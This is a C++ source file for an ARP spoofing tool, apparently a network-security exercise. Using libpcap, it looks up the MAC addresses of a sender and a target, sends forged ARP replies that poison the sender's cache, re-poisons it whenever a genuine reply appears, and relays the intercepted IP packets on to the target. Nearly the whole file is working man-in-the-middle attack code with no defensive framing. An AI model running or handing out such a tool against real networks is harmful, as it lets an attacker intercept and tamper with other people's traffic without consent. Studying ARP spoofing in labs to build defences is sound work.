#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"

#include <stdio.h>
#include <unistd.h>
#include <string.h>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <netinet/ether.h>

#include <signal.h>
#include <thread>

#include <list>
#include <map>

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct EthIpPacket final {
	EthHdr eth_;
	IpHdr ip_;
};
#pragma pack(pop)

#pragma pack(push, 1)
struct FlowInfo final {
	Ip attackerIp = Ip(0);
	Ip senderIp = Ip(0);
	Ip targetIp = Ip(0);
	Mac attackerMac = Mac::nullMac();
	Mac senderMac = Mac::nullMac();
	Mac targetMac = Mac::nullMac();
	EthArpPacket infectPkt;
};
#pragma pack(pop)

std::list<FlowInfo> flows;
std::map<Ip, Mac> arpTable;

void signal_handler (int sig);
void GetMyInfo(Ip* myIp, Mac* myMac, char* dev);
Mac GetMac_ByIp(pcap_t* handle, Ip myIp, Mac myMac, Ip Ip);
EthArpPacket MakeArpPacket(int mode, pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip);
void SendArpPacket(pcap_t* handle, EthArpPacket packet);
void SendIpPacket(pcap_t* handle, EthIpPacket packet, int size);
void Infect(pcap_t *handle);
void Relay(pcap_t* handle);

bool runThread = true;


void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

void signal_handler (int sig)
{
    printf("Interrupt Executed : %d\n",sig);
    runThread = false;
	exit(sig);
}

void GetMyInfo(Ip* myIp, Mac* myMac, char* dev){
	int fd;
	struct ifreq ifr;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;

	memcpy(ifr.ifr_name, dev, IFNAMSIZ -1);

	if(!ioctl(fd, SIOCGIFHWADDR, &ifr))
		*myMac = Mac((uint8_t *)(ifr.ifr_hwaddr.sa_data));
    
    if(!ioctl(fd, SIOCGIFADDR, &ifr))
		*myIp = Ip(std::string(inet_ntoa(((struct sockaddr_in* )&ifr.ifr_addr)->sin_addr)));
	
	close(fd);
	return;
}


Mac GetMac_ByIp(pcap_t* handle, Ip myIp, Mac myMac, Ip Ip){
	Mac mac;
	Mac broadcast = Mac::broadcastMac();
	Mac unknown = Mac::nullMac();

	//eth_smac, eth_dmac, arp_smac, arp_sip, arp_tmac, arp_tip
	struct pcap_pkthdr* header;
	const u_char* replyPacket;

	while(true){
		// mode : 0 = request, 1 = reply
		EthArpPacket packet = MakeArpPacket(0, handle, myMac, broadcast, myMac, myIp, unknown, Ip);
		SendArpPacket(handle, packet);
	
		int res = pcap_next_ex(handle, &header, &replyPacket);
		if (res == 0) return 0;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return 0;
		}
		
		EthArpPacket* resPacket;

		resPacket = (struct EthArpPacket *)replyPacket;
		if(resPacket->arp_.sip() == Ip && resPacket->arp_.tip() == myIp){
			mac = Mac((uint8_t*)(resPacket->arp_.smac_));
			return mac;
		}
		else continue;
	}
	return NULL;
}

// mode : 0 = request, 1 = reply
EthArpPacket MakeArpPacket(int mode, pcap_t* handle, Mac eth_smac, Mac eth_dmac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip){
	EthArpPacket packet;

	packet.eth_.smac_ = eth_smac;
    packet.eth_.dmac_ = eth_dmac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    if(mode == 0){
        packet.arp_.op_ = htons(ArpHdr::Request);
    }else if(mode == 1){
        packet.arp_.op_ = htons(ArpHdr::Reply);
    }
    packet.arp_.smac_ = arp_smac;
    packet.arp_.sip_ = htonl(arp_sip);
    packet.arp_.tmac_ = arp_tmac;
    packet.arp_.tip_ = htonl(arp_tip);
	return packet;
}


void SendArpPacket(pcap_t* handle, EthArpPacket packet){
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	return;
}

void SendIpPacket(pcap_t* handle, EthIpPacket packet, int size){
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), size);
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	return;
}

void Infect(pcap_t *handle){
	while(runThread){
		for(auto iter : flows){
			SendArpPacket(handle, iter.infectPkt);
			sleep(1);
		}
	}
}

void Relay(pcap_t* handle){
	struct pcap_pkthdr* header;
	const u_char* replyPacket;
	while(runThread){

		int res = pcap_next_ex(handle, &header, &replyPacket);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}
		
		EthHdr* eth = (struct EthHdr*)replyPacket;

		// ArpPacket : reinfect
		if(eth->type() == EthHdr::Arp){
			EthArpPacket* arpPacket = (struct EthArpPacket*)replyPacket;
			if(arpPacket->arp_.op() == ArpHdr::Reply){
				for(auto iter : flows){
					if(arpPacket->arp_.sip() == iter.senderIp && arpPacket->arp_.tip_ == iter.targetIp){
						SendArpPacket(handle, iter.infectPkt);
						sleep(1);
						break;
					}
				}
			}
		}

		// IpPacket : relay
		if(eth->type() == EthHdr::Ip4){
			EthIpPacket* ipPacket = (struct EthIpPacket*)replyPacket;
				for(auto iter : flows){
					if(ipPacket->ip_.sip() == iter.senderIp && ipPacket->ip_.dip() == iter.attackerIp){
						ipPacket->eth_.smac_ = iter.attackerMac;
						ipPacket->eth_.dmac_ = iter.targetMac;
						SendIpPacket(handle, *ipPacket, header->caplen);
						break;
					}
				}
		}
	}
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc%2 ) {
		printf("%d\n",argc);
		usage();
		return -1;
	}

	char* dev = argv[1];

	Ip attackerIp; 
	Mac attackerMac;
	
	char errbuf[PCAP_ERRBUF_SIZE];

	GetMyInfo(&attackerIp, &attackerMac, dev);
	printf("[ATTACKER MAC ADDR = %s]\n", std::string(attackerMac).c_str());
	printf("[ATTACKER IP ADDR = %s]\n", std::string(attackerIp).c_str());
	// arpTable[attackerIp] = attackerMac;

	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	for(int i=1;i<argc/2;i++){
		FlowInfo info;
		info.attackerIp = attackerIp;
		info.attackerMac = attackerMac;
		info.senderIp = Ip(argv[2*i]);
		info.targetIp = Ip(argv[2*i+1]);

		//arpTable에 senderIp에 대한 정보가 있는지 확인
		// if(auto ret = arpTable.count(info.senderIp))
		// 	arpTable[info.senderIp] = GetMac_ByIp(handle, attackerIp, attackerMac, info.senderIp);
		// else
		// 	fprintf(stderr, "couldn't get sender mac address (%s)\n",errbuf);
	
		// if(!arpTable.count(info.targetIp))
		// 	arpTable[info.targetIp] = GetMac_ByIp(handle, attackerIp, attackerMac, info.targetIp);
		// else
		// 	fprintf(stderr, "couldn't get target mac address (%s)\n",errbuf);

		// Mac tmp = Mac::nullMac();
		
		// if(arpTable.insert({info.senderIp, tmp}).second)
		// 	arpTable.insert({info.senderIp, GetMac_ByIp(handle, attackerIp, attackerMac, info.senderIp)});
		// if(arpTable.insert({info.targetIp, tmp}).second)
		// 	arpTable.insert({info.targetIp, GetMac_ByIp(handle, attackerIp, attackerMac, info.targetIp)});
		
		
		// info.senderMac = arpTable[info.senderIp];
		// info.targetMac = arpTable[flows.push_back(info);info.targetIp];

		info.senderMac =  GetMac_ByIp(handle, attackerIp, attackerMac, info.senderIp);
		info.targetMac =  GetMac_ByIp(handle, attackerIp, attackerMac, info.targetIp);


		printf("[SENDER MAC ADDR = %s]\n", std::string(info.senderMac).data());
		printf("[SENDER IP ADDR = %s]\n", std::string(info.senderIp).data());

		printf("[TARGET MAC ADDR = %s]\n", std::string(info.targetMac).data());
		printf("[TARGET IP ADDR = %s]\n", std::string(info.targetIp).data());
		
		info.infectPkt = MakeArpPacket(1, handle, info.attackerMac, info.senderMac, info.attackerMac, info.targetIp, info.senderMac, info.senderIp);
		flows.push_back(info);
		printf("Success Attack\n");
	}

	signal(SIGINT, signal_handler);
	std::thread infect_t(Infect, handle);
	std::thread relay_t(Relay, handle);
	
	infect_t.join();
	relay_t.join();


	pcap_close(handle);
}
